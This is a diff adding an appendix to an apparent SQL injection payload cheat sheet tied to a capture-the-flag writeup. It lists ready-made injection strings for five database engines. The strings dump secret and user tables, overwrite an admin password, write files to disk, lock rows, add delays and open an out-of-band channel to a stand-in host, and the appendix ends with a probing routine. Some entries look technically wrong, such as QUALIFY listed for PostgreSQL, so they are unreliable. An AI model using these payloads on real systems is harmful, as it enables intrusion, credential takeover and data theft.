@@ -794,3 +794,196 @@ aggies'UNION SELECT 1; #
 **References:** TAMUctf 2019 — Bird Box Challenge, writeup 13860
 
 ---
+
+---
+
+## Appendix — exotic statement surfaces (rare but real)
+
+Fragments most payload lists never mention — the grammar slots that
+appear when the app's query is itself unusual.
+
+### MySQL-only exotica
+
+```sql
+-- PROCEDURE ANALYSE in a LIMIT/ORDER tail (<=5.7, removed in 8.0):
+' ORDER BY 1 LIMIT 1,1 PROCEDURE analyse(
+   extractvalue(rand(),concat(0x3a,version())),1)-- -
+' LIMIT 1 PROCEDURE analyse(
+   (select extractvalue(rand(),concat(0x3a,(select user())))),1)-- -
+
+-- INTO @var + PREPARE — execute a string built at runtime:
+' UNION SELECT 1 INTO @a; SET @b=0x53454c4543542076657273696f6e2829;
+   PREPARE s FROM @b; EXECUTE s;-- -
+
+-- HANDLER — direct storage-engine row reads (needs stacked+privs):
+'; HANDLER users OPEN; HANDLER users READ FIRST; HANDLER users CLOSE;-- -
+
+-- SQL_CALC_FOUND_ROWS + FOUND_ROWS() — count oracle in pagination:
+' AND 1=1 ORDER BY SQL_CALC_FOUND_ROWS id-- -
+'; SELECT FOUND_ROWS()-- -
+
+-- FOR UPDATE / LOCK IN SHARE MODE — locking side-effects on InnoDB:
+' AND 1=1 FOR UPDATE-- -                      -- blocks writers
+' AND 1=1 LOCK IN SHARE MODE-- -              -- shared locks
+' UNION SELECT 1 FOR UPDATE-- -               -- lock the union rows
+
+-- REPLACE/UPSERT — the write-shaped SELECT alternative:
+'; REPLACE INTO users(user,pass) VALUES('x','y')-- -    -- upsert
+'; INSERT INTO t VALUES(1) ON DUPLICATE KEY UPDATE x=VALUES(x)-- -
+
+-- DO statements (silent execution):
+'; DO SLEEP(5);-- -                            -- delay without SELECT
+'; DO (SELECT 1 FROM (SELECT SLEEP(5))x);-- -    -- nested delay
+
+-- CREATE TABLE AS SELECT — materialise an extraction:
+'; CREATE TABLE loot AS SELECT flag FROM secrets;-- -   -- then read it
+
+-- SELECT ... INTO OUTFILE at statement end (non-UNION tail):
+' LIMIT 0,1 INTO OUTFILE '/tmp/x' LINES TERMINATED BY 0x4141-- -
+
+-- SERIAL / AUTO_INCREMENT sequencing quirks:
+'; INSERT INTO t(a) VALUES(LAST_INSERT_ID(42))-- -       -- pin the id
+' AND LAST_INSERT_ID()>0-- -                             -- last-id oracle
+```
+
+### PostgreSQL exotica
+
+```sql
+-- LATERAL joins — subquery correlated per-row (expression surface):
+' UNION SELECT NULL,x.v,NULL FROM t,LATERAL (SELECT flag FROM
+   secrets LIMIT 1) x(v)-- -
+
+-- FILTER clause on aggregates — conditional counting:
+' UNION SELECT COUNT(*) FILTER (WHERE flag LIKE 'f%'),NULL
+   FROM secrets-- -                                      -- boolean in agg
+
+-- QUALIFY (window-fn filter — newer versions):
+' UNION SELECT flag,NULL FROM secrets QUALIFY row_number() OVER
+   (ORDER BY flag)=1-- -
+
+-- RETURNING clause — the write statements that read back:
+'; INSERT INTO t(x) VALUES(1) RETURNING (SELECT flag FROM secrets)-- -
+'; UPDATE users SET pass='x' WHERE user='admin' RETURNING user,pass-- -
+'; DELETE FROM t WHERE id=1 RETURNING x-- -                -- careful
+
+-- FOR UPDATE / FOR SHARE / SKIP LOCKED / NOWAIT:
+' AND 1=1 FOR UPDATE-- -
+' AND 1=1 FOR UPDATE NOWAIT-- -                            -- fail-fast
+' AND 1=1 FOR SHARE SKIP LOCKED-- -                        -- skip locked rows
+
+-- VALUES as a table:
+' UNION SELECT * FROM (VALUES(1,'x','y')) v(a,b,c)-- -
+' UNION SELECT column2 FROM (VALUES('a','b'),('c','d')) v-- -
+
+-- json_table / xmltable — read JSON/XML as rows:
+' UNION SELECT * FROM json_table('{"a":1}', '$' COLUMNS(a int))-- -
+' UNION SELECT * FROM xmltable('/r/x' PASSING '<r><x>1</x></r>'
+   COLUMNS v text)-- -
+
+-- dblink_connect inside a SELECT (OOB):
+' AND (SELECT dblink_connect('host=x.oob user=u dbname=d'))>0-- -
+
+-- COPY ... FROM STDIN tricks inside stored procs
+-- REFRESH MATERIALIZED VIEW — timing-heavy:
+'; REFRESH MATERIALIZED VIEW CONCURRENTLY bigview;-- -     -- slow, heavy
+```
+
+### MSSQL exotica
+
+```sql
+-- OPENJSON — parse JSON server-side:
+' UNION SELECT * FROM OPENJSON('{"a":1}')-- -
+' UNION SELECT [key],[value] FROM OPENJSON(
+   (SELECT flag FROM secrets FOR JSON AUTO))-- -          -- flag→json→rows
+
+-- FOR JSON AUTO — dump the whole result as ONE JSON cell:
+' UNION SELECT (SELECT flag FROM secrets FOR JSON AUTO),NULL-- -
+' UNION SELECT (SELECT * FROM users FOR JSON PATH),NULL-- -
+   -- often the fastest full-table dump on MSSQL
+
+-- PIVOT — pivot a column to headers:
+' UNION SELECT * FROM (SELECT flag FROM secrets) t
+   PIVOT(MAX(flag) FOR flag IN ([f])) p-- -
+
+-- CROSS APPLY / OUTER APPLY — lateral-style joins:
+' UNION SELECT NULL,x.v,NULL FROM t CROSS APPLY
+   (SELECT flag FROM secrets) x(v)-- -
+
+-- MERGE — upsert-shaped:
+'; MERGE users t USING (SELECT 'x' u,'y' p) s ON t.user=s.u
+   WHEN MATCHED THEN UPDATE SET pass=s.p
+   WHEN NOT MATCHED THEN INSERT(user,pass) VALUES(s.u,s.p);-- -
+
+-- TOP ... WITH TIES:
+' UNION SELECT TOP 1 WITH TIES flag,NULL FROM secrets
+   ORDER BY flag-- -
+
+-- TABLESAMPLE — random rows:
+' UNION SELECT flag,NULL FROM secrets TABLESAMPLE (1 ROWS)-- -
+```
+
+### Oracle exotica
+
+```sql
+-- MODEL clause — spreadsheet-style rules:
+' UNION SELECT flag,NULL FROM secrets MODEL RETURN ALL ROWS
+   DIMENSION BY (ROWNUM r) MEASURES(flag) RULES()-- -
+
+-- PIVOT/UNPIVOT:
+' UNION SELECT * FROM (SELECT flag FROM secrets) PIVOT
+   (MAX(flag) FOR flag IN ('x'))-- -
+
+-- MATCH_RECOGNIZE — row-pattern matching:
+' UNION SELECT flag,NULL FROM secrets MATCH_RECOGNIZE(
+   ORDER BY flag MEASURES flag AS f ALL ROWS PER MATCH
+   PATTERN (x) DEFINE x AS 1=1)-- -                       -- heavy; rare
+
+-- CONNECT BY — hierarchical:
+' UNION SELECT flag,NULL FROM secrets START WITH ROWNUM=1
+   CONNECT BY PRIOR flag=flag-- -                        -- recursion trap
+' UNION SELECT LEVEL,NULL FROM dual CONNECT BY LEVEL<=10-- - -- rows 1-10
+
+-- FETCH FIRST/OFFSET (12c+):
+' UNION SELECT flag,NULL FROM secrets FETCH FIRST 1 ROWS ONLY-- -
+' UNION SELECT flag,NULL FROM secrets OFFSET 1 ROWS
+   FETCH NEXT 1 ROWS ONLY-- -
+
+-- XMLTABLE:
+' UNION SELECT * FROM XMLTABLE('/r/x' PASSING
+   XMLTYPE('<r><x>'||(SELECT flag FROM secrets WHERE ROWNUM=1)||
+   '</x></r>') COLUMNS v varchar2(4000) PATH '.')-- -
+```
+
+### SQLite exotica
+
+```sql
+-- UPSERT (3.24+):
+'; INSERT INTO t(a) VALUES(1) ON CONFLICT(a) DO UPDATE SET a=2;-- -
+
+-- RETURNING (3.35+):
+'; INSERT INTO t(a) VALUES((SELECT flag FROM secrets)) RETURNING a;-- -
+'; UPDATE users SET pass='x' WHERE user='admin' RETURNING user,pass;-- -
+
+-- FILTER clause on aggregates:
+' UNION SELECT COUNT(*) FILTER (WHERE flag LIKE 'f%'),NULL
+   FROM secrets-- -
+
+-- Window functions:
+' UNION SELECT flag,row_number() OVER (ORDER BY flag),NULL
+   FROM secrets-- -
+
+-- generate_series ext (if loaded):
+' UNION SELECT value,NULL FROM generate_series(1,10)-- -
+
+-- STRICT tables / WITHOUT ROWID quirks — typing matters less than
+-- PG but more than classic SQLite:
+' UNION SELECT typeof(flag),flag,NULL FROM secrets-- -     -- type check
+```
+
+### The rule across all of them
+
+Every exotic slot is still just a slot — the probe question is the
+same: does the statement accept expressions, subqueries, or stacked
+siblings at the point your value lands? Probe `1`/`(select 1)`/
+`;select 1`/` UNION SELECT 1` in that order, and the channel that
+answers tells you which of the earlier files owns the rest.
